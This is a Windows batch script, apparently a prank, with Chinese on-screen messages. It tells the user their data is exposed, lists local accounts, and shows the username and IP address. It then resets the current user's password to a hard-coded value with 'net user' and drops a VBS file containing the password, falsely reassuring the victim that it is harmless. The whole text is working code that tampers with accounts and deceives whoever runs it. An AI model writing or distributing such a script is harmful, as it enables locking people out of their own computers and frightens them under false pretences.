
@echo off
echo 你的电脑资料已暴露
color 2
echo 不信你看,哈哈！！
echo 请按任意键继续...
pause>nul
echo 所有组用户名：

echo.

for /f "skip=4 tokens=1-4" %%i in ('net user') do (

    if not "%%i"=="命令成功完成。" echo %%i

    if not "%%j"=="" echo %%j

    if not "%%k"=="" echo %%k

)

echo.

echo 你的用户名：%username%

echo 请按任意键继续...
pause>nul

echo 你的IP地址：
@echo off
ver|findstr "5.1" >nul && (
    set "m=ipconfig^|findstr /i "ip address""
)|| (
    set "m=ipconfig^|findstr /i "ipv4""
)
for /f "tokens=14* delims=: " %%1 in ('%m%')do echo %%2

echo 请按任意键继续...
pause>nul

echo 正在修改密码...
net user %username% lousiyuan
echo 修改成功，哈哈
echo 正在生成密码...
echo if msgbox("是否退出",vbyesno)=vbyes then   msgbox "密码：lousiyuan"   else msgbox "重选"  end if >>密码文件.vbs 
echo 记得点开，放心，没毒,密码在里面
pause>nul
